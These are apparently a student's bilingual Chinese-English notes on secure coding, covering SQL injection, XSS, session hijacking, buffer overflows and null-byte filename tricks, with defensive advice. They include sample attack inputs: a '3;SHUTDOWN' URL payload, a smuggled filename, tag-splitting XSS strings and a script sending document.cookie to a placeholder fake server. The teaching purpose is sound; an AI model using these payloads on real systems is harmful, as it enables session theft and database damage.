# Content

* [Content](#content)
* [子系统数据传递：Passing Data to Subsystem](#子系统数据传递passing-data-to-subsystem)
* [问题-SQL注入：SQL Injection Problems](#问题-sql注入sql-injection-problems)
* [注入例子1：Table of Usernames](#注入例子1table-of-usernames)
* [注入例子2:Table of Passwords](#注入例子2table-of-passwords)
* [SQL注入问题-布尔优先级：Boolean Precedence](#sql注入问题-布尔优先级boolean-precedence)
* [未检查的（非受控的）元字符：Unchecked Metacharacter](#未检查的非受控的元字符unchecked-metacharacter)
* [SQL注入问题-分号：Semicolon](#sql注入问题-分号semicolon)
* [SQL注入问题-并集选择：Union Select](#sql注入问题-并集选择union-select)
* [SQL注入问题-子查询：Sub Queries](#sql注入问题-子查询sub-queries)
* [解决前例-特殊字符ASCII码：ASCII COdes for special Characters](#解决前例-特殊字符ascii码ascii-codes-for-special-characters)
* [ASP页面注入例子：Example Using ASP](#asp页面注入例子example-using-asp)
* [===========](#)
* [问题-过于丰富的错误信息：Helpful Error Messages](#问题-过于丰富的错误信息helpful-error-messages)
* [错误信息-例子1(外部库,框架)：Helpful Error Messages Example](#错误信息-例子1外部库框架helpful-error-messages-example)
* [错误信息-例子2(GROUP获取列)：Using Group to get Columns](#错误信息-例子2group获取列using-group-to-get-columns)
* [存储过程：Stored Procedures](#存储过程stored-procedures)
* [静态分析意义：Static Analysis Justification](#静态分析意义static-analysis-justification)
* [===========](#-1)
* [输出处理：Output Handling](#输出处理output-handling)
* [HTML注入：HTML Injection](#html注入html-injection)
* [HTML注入-例子：Example-A Guest Book](#html注入-例子example-a-guest-book)
* [会话劫持：Session Hijacking](#会话劫持session-hijacking)
* [会话劫持例子](#会话劫持例子)
* [避免XSS攻击](#避免xss攻击)
* [===========](#-2)
* [缓冲区溢出攻击：Programming Language Problems](#缓冲区溢出攻击programming-language-problems)
* [缓冲区溢出例子：Unix Password Checking](#缓冲区溢出例子unix-password-checking)
* [===========](#-3)
* [C/C++空字节： Poisoned null byte](#cc空字节-poisoned-null-byte)
* [客户端也不安全：Client-Side Secuirty Doesn't Exist](#客户端也不安全client-side-secuirty-doesnt-exist)
* [===========](#-4)
* [避免使用过期会话ID:Avoid Stale Session ID](#避免使用过期会话idavoid-stale-session-id)
* [不要提供过于丰富的错误信息：Do not provide helpful error messages](#不要提供过于丰富的错误信息do-not-provide-helpful-error-messages)
* [注入-元字符：Meta Characters](#注入-元字符meta-characters)
* [Never massage data](#never-massage-data)
* [===========](#-5)

# 子系统数据传递：Passing Data to Subsystem

许多应用程序将数据传递给子系统。•	Many applications pass data to subsystems:

- SQL数据库。•	SQL database.
- 操作系统。•	Operating system.
- 命令解释器。•	Command interpreters.

**这通常是通过建立字符串并将其传递给子系统来完成的**。•	Often this is done by building strings and passing them to the subsystem.

- 然后，它们被解析或 "解释 "为命令或数据。•	They are then parsed or ‘interpreted’ as commands or data.
- 大多数内容只是**纯文本，或数据**。•	Most of the content is just plain text, or data.
  - **然而，字符串可以包含具有特殊含义的字符**。•	However, the string can contain characters with special meanings.
    - **元字符**，可以作为纯文本传递。•	Meta-characters, that can be passed as plain text.

# 问题-SQL注入：SQL Injection Problems

SQL注入涉及在数据中引入元字符以改变操作的上下文。•	SQL injection involves the introduction of metacharacters in data to change the context of the operation.

- 许多系统将**SQL查询传递给数据库子系统**。•	Many systems pass SQL queries to a database subsystem.
  - 这些查询通常是由**用户输入的**。•	The queries are often constructed from user input.
- **这些查询将包含元字符，可以被攻击者滥用**。•	These queries will contain meta-characters which can be misused by an attacker.
  - 可以导致崩溃。•	Can cause crashes.
  - 可以注入恶意代码。•	Can inject malicious code.
  - 例如，'将从命令模式切换到输入模式，反之亦然。•	For example, ‘ will switch form command mode to input mode and vice versa.
  - 用户可以在他们的输入中加入'，让SQL切换到命令模式。•	A user can put ‘ in their input, getting SQL to switch to command mode.
  - 这就允许将命令注入到SQL系统中。•	This allows injection of a command into the SQL system.
  - 注释`--`也是元字符

# 注入例子1：Table of Usernames

![](/static/2022-04-21-15-46-35.png)
![](/static/2022-04-21-15-49-24.png)

# 注入例子2:Table of Passwords

![](/static/2022-04-21-15-55-07.png)
![](/static/2022-04-21-15-59-18.png)

---

# SQL注入问题-布尔优先级：Boolean Precedence

![](/static/2022-04-21-20-57-53.png)

# 未检查的（非受控的）元字符：Unchecked Metacharacter

元字符，，SQL关键字？

- 问题不在于SQL中的`--`注释或布尔优先级。•	Problem is not the -- comment in SQL or the boolean precedence.
- 问题是Java程序**允许元字符'被作为数据输入**。•	Problem is the Java program which allows the metacharacter ‘ to be entered as data.
  - 当SQL解析其查询时，它用第一个'从命令模式**切换到数据模式**。•	When SQL parses its query, it used the first ‘ to switch from command mode to data mode.
  - 第二个'又**切换回命令模式**，以此类推。•	The second ‘ switches back to command mode and so on.
  - 这使得我们可以**将命令作为数据输入**。•	This allows us to enter commands as data.
- 这是一个棘手的问题，因为'可以是一个名字的有效部分。•	This is a tricky problem because ‘ can be a valid part of a name.
  - 例如，O'Donnell。•	O’Donnell for example.

# SQL注入问题-分号：Semicolon

![](/static/2022-04-22-01-12-19.png)

# SQL注入问题-并集选择：Union Select

![](/static/2022-04-22-01-15-04.png)
![](/static/2022-04-22-01-18-26.png)

* 结果集JOIN，，字段类型要匹配

# SQL注入问题-子查询：Sub Queries

![](/static/2022-04-22-01-20-17.png)
![](/static/2022-04-22-01-26-54.png)

* `||`拼接操作

# 解决前例-特殊字符ASCII码：ASCII COdes for special Characters

- 我们可以通过在**使用变量来构建SQL**查询**之前检查变量的形式是否正确**来避免前面的问题。•	We can avoid the previous problems by checking that variables are of the correct form before using them to construct SQL Queries.
- <font color="deeppink">在**SQL Server**中，任何字符串都可以使用单个字符的ASCII码来输入</font>。•	In SQL Server, any string can be input using the ASCII codes of the individual characters.
  - 字符串SQL可以被输入为`char(83)+char(81)+char(76)` •	The string SQL can be input as char(83)+char(81)+char(76)
- 在**PostgresSQL和MYSQL**中也可以使用**类似**的方法。•	A similar approach can be used in PostgresSQL and MYSQL.
  - **MYSQL**也会接受**十六进制**，如0x53514c •	MYSQL will also accept hex such as 0x53514c
    - 这也是字符串SQL •	This is also the string SQL
- <font color="deeppink">这样检查有效字符可能相当复杂</font>。•	Checking for valid characters thusly can be quite complicated.

# ASP页面注入例子：Example Using ASP

下面是一个在SQL查询中注入代码的真实例子。•	Here is a real-life example of injecting rouge code into a SQL query.

- 一个支付系统的网页可以通过URL访问。•	A payment system web page could be accessed with the URL:
  - http://pay.example/default.asp?id=3;SHUTDOWN
- **字符串3;SHUTDOWN被注入到SQL中作为ID号，并适当地关闭了数据库，多次**。•	The string 3;SHUTDOWN was injected into the SQL as the id number and duly shutdown the database, several times.
  - query parameter的值，，`3`和后面的内容从前端传入后端，，操作DB
  - 这个建议是在一个讨论组中提出的，人们不认为这能起作用。•	This suggestion was made in a discussion group, it was not thought this would work.
    - 但它确实做到了。•	But it did.
- 这个例子成为SQL注入的一个臭名昭著的示范。•	This example became an infamous demonstration of SQL injection.

# ===========

# 问题-过于丰富的错误信息：Helpful Error Messages

- 以前的攻击都是**依靠表和列的名称的知识**。•	The previous attacks have relied on knowing the names of the tables and columns.
  - 通常一开始需要花费时间来研究DB中存在什么表名，字段
- 这通常可以**从有用的错误信息中获得**。•	This can often be obtained form helpful error messages.
- <font color="deeppink">试图访问一个无效的列会导致一个错误信息，其中列出了被连接的表中的所有列</font>。•	An attempt to access an invalid column can result in an error messages that lists all the columns in the table being attached.
- 另外，**也可以一个一个地获取列**。•	Alternatively, columns can be obtained one by one.
- 这里的寓意是<font color="blue">避免为用户提供有用的错误信息，这些信息也可能被攻击者看到</font>。•	The moral here is to avoid helpful error messages for users that could also be seen by an attacker.
  - 一般要避免，理论上能使系统更安全。但是有时候与网页设计原则相冲突，，因为我们想提供用户尽可能多的帮助。。
  - **因此，提供有用的错误信息是允许的，，但是不要提供与系统内部安全相挂钩的，能拼凑得出一些事实的** try and help users but dont compromise security

# 错误信息-例子1(外部库,框架)：Helpful Error Messages Example

![](/static/2022-04-22-02-12-18.png)

除了开发代码本身，某些**库&框架 libary & frameworks**，会提供丰富的错误信息（**通常用于帮助开发者进行调试**。

* 对某些库，框架的信息不加以处理，，，raw调试信息展示给用户会存在问题 
  * 某些框架配置可以通过开启关闭`debug`，，来在生产环境中去掉这些信息
  * **针对没有提供类似配置选项的，，在使用这类库,框架的时候，要清楚存在的风险【即，外部软件本身也会引入风险，，但更多的来讲是帮助了开发者**

:orange: 可能的解决方法，，避免这类错误

* 错误处理逻辑handling code
  * 前端，后端
  * <font color="deeppink">代价是引入了时间成本等，，所以构建系统的时候要优先化 & 理解存在的风险</font>

# 错误信息-例子2(GROUP获取列)：Using Group to get Columns

![](/static/2022-04-22-02-19-50.png)

* 快速过下GROUP BY,,一般结果select选中groupby 字段，，其他字段必须涉及聚合函数之类的
* HAVING对group by结果进行筛选

---

![](/static/2022-04-22-15-26-02.png)

* 这里面 `SELECT *`挺关键的

# 存储过程：Stored Procedures

boiler template复用

- 存储过程的调用就像过程调用一样。•	Stored procedures are invoked like procedure calls.
- 我们**通过名称调用存储过程，并提供适当的参数**。•	We invoke the procedure by name an and provide appropriate parameters.
  - 我们不构建一个完整的SQL命令。•	We do not construct a full SQL command.
- 但是，**参数也可以包含元字符，其效果与前面的攻击类似**。•	However, the parameters can also contain metacharacters with similar effects to the previous attacks.
  - 如果我们有一个名为**insert_person的存储过程，需要2个参数，我们可以修改参数**。•	If we have a stored procedure called insert_person that takes 2 parameters, we can modify the parameters.
  - 我们会发现自己处于和前面一样的情况。•	We will find ourselves in the same situation as previous.
    - <font color="deeppink">要确保过程本身语法正确，，查询没有错。。如果还是能拼接达到注入，还是存在问题</font>

---

:orange: Solution

**我们需要识别每一个可能的元字符，并纠正所有传递给子系统的数据**。•	We need to identify every possible metacharacter and correct all data that is passed to a subsystem.

- 我们可以**转义元字符，关闭其特殊含义**。•	We can escape the metacharacter, turning off its special meaning.
  - '必须出现在像O'Donnell这样的名字中。•	‘ must be in a name like O’Donnell.
- 我们可以**消除元字符**。•	We can eliminate the metacharacter.
  - 缓解威胁, 消除威胁
  - 在数字中不需要;，所以可以删除。•	; is not needed in a number so can be removed.
  - **但是要注意元字符出现的context，，，如果本身涉及批量sql语句，某些位置的`;`可能是不能被消除的**
- 有些系统如PHP让我们在输入时转义所有的元字符。•	Some systems such as PHP let us escape all metacharacters on input.
- 这很有帮助，但问题是由我们传递给子系统的参数引起的。•	This is helpful, but the problems are caused by parameters that we pass to subsystems.
- **存储过程也比临时查询更稳健**。•	Stored procedures are also more robust than ad-hoc queries.
- 我们**仍然需要检查准备语句的参数**。•	We still need to check parameters to prepared statements.

# 静态分析意义：Static Analysis Justification

这就是为什么我们要对代码进行静态分析。•	This is why we perform static analysis on code.

- 让我们**能够确定在哪里需要关注此类问题**。•	Allows us to identify where we would need to be concerned with such issues.
- **所有展示的问题都来自于无法控制的用户输入**。•	All the problems demonstrated come from user input that cannot be controlled.
  - 因此，**在静态分析中所坚持的政策提供了一个关于在哪里进行这些检查的指示**。•	Therefore the policy that is being upheld in static analysis provides an indication on where to perform these checks.
- 我们应该**如何处理这个问题，主要取决于我们想解决哪些可能的问题**。•	How we should handle the problem, largely depends on what possible problems we want to address.
- 在**讨论SQL注入时，有各种攻击载体**。•	There are various attack vectors when discussing SQL injection.
- 都试图绕开安全机制，所以知道代码层面，不可信数据在哪里与可信数据相会，我们就能提出sanitizers来缓解，或者至少知道问题存在并进行报告

# ===========

# 输出处理：Output Handling

在网络应用中，**服务器最终会将数据传回客户端机器上运行的浏览器**。•	In a web application the server eventually passes data back to the browser running on the client’s machine.

- 如果攻击者能够插入恶意代码，那么它就会被客户端的浏览器执行。•	If an attacker can insert malicious code, then it will be executed by the client's browser.
  - 这是向子系统传递数据的一种形式。•	This is a form of passing data to a subsystem,
  - 有一个较长的往返过程，数据起源于客户端的机器，被传递到服务器，然后再次出现在可能是不同客户端的浏览器中。•	There is a longer round trip, with data originating on the client’s machine, being passed to the server, and then appearing again in potentially a different client’s browser.
- 被称为**跨域脚本(XSS**) •	Known as Cross-Site Scripting (XSS)
  - 恶意代码将是**HTML** •	The malicious code will be HTML
  - 通常是在一个**脚本标签**内。•	Often inside a script tag.

# HTML注入：HTML Injection

HTML注入涉及通过提供的机制将脚本引入HTML，以操纵渲染的HTML。•	HTML injection involves introducing scripts into HTML through mechanisms provided to manipulate rendered HTML.【很难控制其他人在系统上做什么

- 常常被用来提供重定向到恶意网站（js。•	Often used to provide redirects to malicious sites.
- 也可用于劫持会话(XSS。•	Can also be used to hijack sessions.
- 有时，**用户输入被用来创建一个HTML文件，然后被执行**。•	Sometimes user input is used to create a HTML file that is then executed.
- 如果用户输入的是`<script>something</script>`，那么我们就**注入了一个命令**。•	If the user input is `<script>something</script>` then we have injected a command.
- **这是一种跨网站脚本的形式**。•	This is a form of cross site scripting.
- 我们可以**检查脚本，但HTML标签是不分大小写的，因此我们应该在检查前减少到小写**。•	We can check for script, but HTML tags are not case sensitive and so we should reduce to lower case before checking.
  - 这将使我们能够识别像`<ScRiPt>`这样的东西。•	This will allow us to identify things like `<ScRiPt>`

# HTML注入-例子：Example-A Guest Book

用户名显示注入，，`<!--`注释

![](/static/2022-04-22-19-29-36.png)

* 本身这种输入可能不是恶意的，，不过确实造成了显示问题

---

a more malicious example

![](/static/2022-04-22-19-31-16.png)

* 恶意弹窗

# 会话劫持：Session Hijacking

**XSS可以被用来劫持用户的会话**，换句话说，就是冒充他们。•	XSS can be used to hijack a users session, in other terms, impersonate them.【跨域注入

- 会话通常由cookie维护。•	Sessions are normally maintained by cookies.【因为HTTP无状态，，
  - **当一个会话开始时，服务器会向客户端发送一个cookie**。•	When a session starts, the server sends a cookie to the client.
  - 客户端在每次通信时都将cookie返回给服务器。•	The client returns the cookie to the server every time communication occurs.
  - 然后，服务器就会知道在众多的客户端中，是哪个客户端提出了新的请求。•	The server then know which client, out of many, is making the new request.【**识别客户端**
- 如果攻击者能够得到cookie，他们就可以冒充受害者。•	If the attacker can get the cookie, they can impersonate the victim.
- 客户端和服务器之间的通信是唯一的。•	The communications between the client and server are unique.
  - 攻击者必须欺骗服务器，使其向受害者发送恶意代码。•	The attacker must trick the server into sending malicious code to the victim.

# 会话劫持例子

我们假设该网站让用户添加评论，所有用户都可以看到其他用户的评论。•	Let us assume the web site lets users add comments, and all users can see the comments of other users.

- 攻击者**添加了一个评论，其中包括一个连接到由攻击者运行的另一个服务器的脚本**。•	The attacker adds a comment that includes a script that connects to another server run by the attacker.
- 当受害者阅读评论时，他们会被**重定向到假网站**。•	When the victim reads the comments, they are redirected to the fake website.
  - 他们的**cookie会以通常的方式被发送到假网站**。•	Their cookie is sent to the fake website in the usual way.
  - 然后，**攻击者**可以**存储**它。•	The attacker can then store it.
- 攻击者的网站然后将用户重定向到原始网站。•	The attacker’s website then redirects the user back to the original site.
  - 受害者只是注意到一个轻微的闪动。•	The victim just notices a slight flicker.
- 然后，攻击者可以连接到原来的服务器，假装是受害者。•	The attacker can then connect to the original server, pretending to be the victim.

---

简化的劫持脚本例子 simplified Hijacking Script

- 受害者会收到一个嵌入脚本的HTML页面（comment里。•	The victim receives a HTML page with the embedded script.

```html
<script>
document.location.replace("fake_server "+"? what="+document.cookie)
</script>
```

- 这里的代码将把受害者重定向到假服务器。•	The code here will redirect the victim to the fake server.
- **该代码有一个单参数what，其值是会话cookie**。•	The code has a single parameter what with the session cookie as its value.
- 这允许攻击者在他们控制的服务器上使用php窃取cookie id。•	This allows the attacker to steal the cookie id using php on the server they control.
- 一些额外的代码将是必要的，以便**在没有无限循环的情况下将受害者送回原网站**。•	Some additional code will be necessary to send the victim back to the original website without an infinite loop.

浏览器本身会提供一些安全措施

# 避免XSS攻击

- **在输出（HTML）被发送到客户端之前验证它**。•	Validate output (HTML) just before it is sent to the client.
- 攻击脚本可能来自几个地方，**我们可能没有检查所有的地方**。•	The attack script might have come from several places and we might not check all of them.
- **禁用网页中的JavaScript**是一个激烈的步骤，**往往会导致网站功能的破坏**。•	Disabling JavaScript in web pages is a drastic step that often causes site functionality to break.
- 如果攻击者注入了以下形式的代码。•	If an attacker has injected code of the form:
  - `<scr<script>ipt>`。
  - Eliminating `<script>` will leave `<script>`

# ===========

# 缓冲区溢出攻击：Programming Language Problems

缓冲区溢出攻击涉及到**向不应该被你的程序触及的内存区域写东西**。•	Buffer overflow attacks involves writing to areas of memory that should not be touched by your program.

- 攻击者可以注入恶意代码，并在缓冲区内提供对恶意有效载荷的回调。•	Attackers can inject malicious code and provide a callback to the malicious payload within the buffer.
- 回调通常在堆栈中被覆盖，地址指向恶意的有效载荷。•	The callback is often overridden on the stack with an address pointing to the malicious payload.
- **这些攻击正变得越来越少，因为大多数现代内存控制器实现了地址随机化以防止这种情况**。•	These attacks are becoming more scarce, as most modern memory controllers implement address randomization to prevent this.
  - example: randomization of virtual memory address space
  - 而缓冲区溢出依赖于静态内存空间，因为攻击者知道恶意代码注入位置，如果是动态的就很难实现
  - 旧linux系统上的root用户破解是一个例子（见后面
- **C和C++不会自动检查我们是否超过数组边界**。•	C and C++ do not automatically check to see if we exceed an array bound.
  - 高级语言如Java，python会做边界检查
  - 如果数组边界检查很重要，就必须由程序员来做。•	If array bound checking is important it must be done by the programmer.
- 如果没有检查字符串的大小，而用户又提供了一个超长的字符串，**一个将用户定义的字符串存储在char数组（缓冲区）中的程序就会覆盖其他数组**。•	A program that takes a user defined string and stores it in a char array (a buffer) can overwrite other arrays if the size of the string is not checked and the user provides an extra long string.
  - 这就会造成常见的**缓冲区溢出攻击**。•	This can cause the common buffer overflow attack.

![](/static/2022-04-22-20-10-00.png)

# 缓冲区溢出例子：Unix Password Checking

![](/static/2022-04-22-20-14-53.png)

* 因为线性存储，所以可以破解

![](/static/2022-04-22-20-15-56.png)
![](/static/2022-04-22-20-23-09.png)
![](/static/2022-04-22-20-25-15.png)

# ===========

# C/C++空字节： Poisoned null byte

通过利用这种数据的解释方式，空字节可以被用来攻击系统。•	Null bytes can be used to attack systems by exploiting how such data is interpreted.

* <font color="red">编程语言及其数据表示法之间缺乏标准化是问题的主要根源。还有攻击者的恶意动机</font>•	The lack of standardization between programming languages and their representation of data is the main root of the problem.malicious intent of people.

C和C++使用一个空字节（'\0'）来结束一个字符串。•	C and C++ use a null byte (’\0’) to terminate a string.

- "Peter "被存储为'P' 'e' 't' 'e' 'r' '\0' 。•	“Peter” is stored as ‘P’ ‘e’ ‘t’ ‘e’ ‘r’ ‘\0’
- **其他程序语言为字符串提供一个明确的长度参数**。•	Other program languages provide an explicit length parameter for strings.
  - "Peter "可以存储为5 'P' 'e' 't' 'e' 'r' 。•	”Peter” can be stored as 5 ‘P’ ‘e’ ‘t’ ‘e’ ‘r’
- 这种不匹配(语言差异)意味着我们可以使用一种语言**在传递给C或C++程序的字符串中明确地包含一个空字符**。•	This mismatch means that we can use one language to explicitly include a null character in a string that is passed to a C or C++ program.

---

例如，我们可能想用PHP在Apache服务器上创建一个图片目录。•	For example, we might want to create a directory of images on an Apache server using PHP.

- 客户端被传递一个图像文件的名称，**一个Visual Basic程序检查该文件是否以.jpg或.png结尾【后缀名检查**】。•	The client is passed the name of an image file and a Visual Basic routine checks that the file either ends with .jpg or .png.
- 然后该文件被传递给服务器并被处理。•	The file is then passed to the server and processed.
- 我们可以构建一个包含攻击代码的文件，文件名是•	We can construct a file that contains attack code with a filename
  - `14crack.php/0.jpg`
  - Visual Basic将接受这个文件**作为一个图像文件**，并可以发送到服务器上。•	Visual Basic will accept this as an image file and can be sent to a server.
  - **服务器会将其视为一个.php的C文件**,crack.php,并执行它。•	The server will see this as a .php C file crack.php and execute it.
    - 因为`\0`，，不会读到实际的扩展名`.jpg`，，然后会执行php脚本
    - <font color="red">编程语言及其数据表示法之间缺乏标准化是问题的主要根源。还有攻击者的恶意动机</font>•	The lack of standardization between programming languages and their representation of data is the main root of the problem.malicious intent of people.
  - 这可以被用来绕过**脚本的静态分析检查**。•	This can be used to bypass static analysis checks on scripts.
    - 因为静态分析器只检查suffix，，确认是`.jpg`就通过执行。所以检查内容也很重要，因为jpg里面不会有Php code

# 客户端也不安全：Client-Side Secuirty Doesn't Exist

- **攻击者可以发送恶意的信息**。•	The attacker can send malicious information.
  - HTTP头文件 HTTP headers
  - Cookies
  - 隐藏字段 Hidden fields  
  - 可选值。Optional values.
- 不要相信HTML请求中的REFERER标头。 Don’t trust the REFERER header in HTML requests.
  - 这些是**来自用户的，可以伪造**。These come from the user and can be forged.
- **不要使用客户端脚本进行验证、授权和认证**。Never use client side scripts for validation, authorisation, authentication.
  - 应在server side处理，，客户端仅提供数据

# ===========

# 避免使用过期会话ID:Avoid Stale Session ID

一旦用户访问一个网站，就会发出一个会话ID。•	A session ID will be issued as soon as the user accesses a web site.

- 如果它在用户登录后被使用，那么这就是一个权限提升的问题。•	If it is used after the user logs in then this is an elevation of privilege problem.
- 攻击者更容易在会话开始时获得会话ID。•	It is easier for an attacker to get a session ID at the start of a session.
- **确保会话ID有时限timeout,必要时能进行重新认证等操作**
  - 不要太长不要太短，能有效避免会话劫持

# 不要提供过于丰富的错误信息：Do not provide helpful error messages

- 攻击者可以挑起错误信息来获取目标的信息。•	Attackers can provoke error messages to acquire information about their targets.
- 如果你知道你面对的是什么软件，就更容易闯入一个系统。•	Easier to break into a system if you know what software you are dealing with.
- **确保知道使用的框架和库的一些特性，，生产和开发环境配置**
  - 生产环境尽量关闭一些可能给用户提供过于丰富错误信息的配置
  - 对于不能通过选项关闭的，使用时要清楚存在的风险

# 注入-元字符：Meta Characters

- **识别每一个可能的元字符**。•	Identify every possible meta-character.
- **在向子系统传递数据之前检查元字符**。•	Check meta-characters before passing data to subsystems.
  - 白名单比黑名单更好用。•	A whitelist is better to use than a blacklist.
    - 检查来缓解，，？而不是一次性禁用了？
- **尽量将数据与控制信息分开传递**。•	Try to pass data separate from control information.
- **识别所有输入到应用程序的来源**。•	Identify all sources of input to the application.
  - 不仅仅是用户输入的数据。•	Not just data entered by the user.
  - 如果使用隐藏字段。•	Hidden fields if used.
  - 复选框和其他GUI项目。•	Check boxes and other GUI items.
- **一旦你收到了来自用户的信息，就把它储存在服务器上**。•	Once you have received information from the user, store it on the server.
  - 如果你能避免的话，不要把它传回给客户端。•	Do not pass it back to the client if you can avoid it.

# Never massage data

。。什么b玩意，应该就是不要揭露系统信息，，防止攻击者拼凑推断哪部分出错（过于具体的

- **如果用户输入的是垃圾数据，不要试图用它来工作**。•	If the user enters garbage data, don’t try and work with it.
  - **丢弃它并让用户再次输入**。•	Discard it and get the user to enter it again.
  - You do not know ahead of time if garbage data is deliberate or a genuine mistake.
- Attackers can anticipate massaging if implemented and try to circumvent it.
- Massagers can easily become a liability and a focus of an attacker.

# ===========